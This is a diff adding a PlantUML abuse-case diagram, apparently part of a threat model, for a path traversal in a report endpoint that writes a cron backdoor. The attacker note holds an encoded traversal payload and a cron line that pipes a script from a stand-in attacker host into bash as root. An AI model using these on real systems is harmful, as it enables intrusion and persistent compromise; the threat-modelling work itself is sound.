@@ -1,0 +1,65 @@
+@startuml AC-06_Path_Traversal
+
+title AC-06 — Path Traversal Writes Cron Entry Outside /var/vendnet/ Sandbox\nSTRIDE: Elevation of Privilege | Severity: Critical | Mitigation: M-06
+
+left to right direction
+
+skinparam usecase {
+  BackgroundColor<< abuse >> #FFCCCC
+  BorderColor<< abuse >> #CC0000
+  FontColor<< abuse >> #CC0000
+  BackgroundColor<< normal >> #DDEEFF
+  BorderColor<< normal >> #336699
+}
+skinparam actorBackgroundColor #EEF
+skinparam actorBorderColor #336699
+skinparam noteFontSize 10
+
+actor "Administrator\n(Legitimate)" as admin #DDEEFF
+actor "Malicious Admin /\nCompromised Account" as attacker #FFCCCC
+
+rectangle "VendNet System" {
+  usecase "Generate Report in\n/var/vendnet/reports/" as UC6 << normal >>
+  usecase "Bypass Allowlist via\nURL-Encoded Traversal Sequence" as AC6a << abuse >>
+  usecase "Traverse Path to Write\nCron Entry in /etc/cron.d/" as AC6 << abuse >>
+  usecase "Establish Persistent\nOS-Level Backdoor" as AC6b << abuse >>
+}
+
+admin --> UC6
+
+attacker --> AC6a
+AC6a ..> AC6   : <<enables>>
+AC6 ..> UC6    : <<threatens>>
+AC6 ..> AC6b   : <<extends>>
+
+note right of AC6a
+  **Preconditions:**
+  • Valid Administrator-scoped JWT
+  • POST /admin/reports accepts user-supplied
+    reportType as path component
+  • Regex ^[a-zA-Z0-9_-]+$ runs against
+    RAW (un-decoded) string — bypass window
+  • Service account has write access to
+    /etc/cron.d/ (overly broad OS permissions)
+end note
+
+note right of AC6b
+  **Impact:**
+  Integrity: cron backdoor survives patch
+  cycles and container restarts
+  Confidentiality: OS shell reads MySQL creds,
+  decrypts backup archives, extracts all PII
+  Availability: cron can wipe disk or stop services
+  Business: persistent compromise, full forensic
+  re-image required, GDPR notification
+end note
+
+note bottom of attacker
+  **Attack vector:**
+  {"reportType":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fcron.d%2fvendnet_persist"}
+  Decoded path resolves to:
+  /var/vendnet/reports/../../../../etc/cron.d/vendnet_persist
+  Cron payload: "* * * * * root curl http://attacker.com/implant.sh | bash"
+end note
+
+@enduml
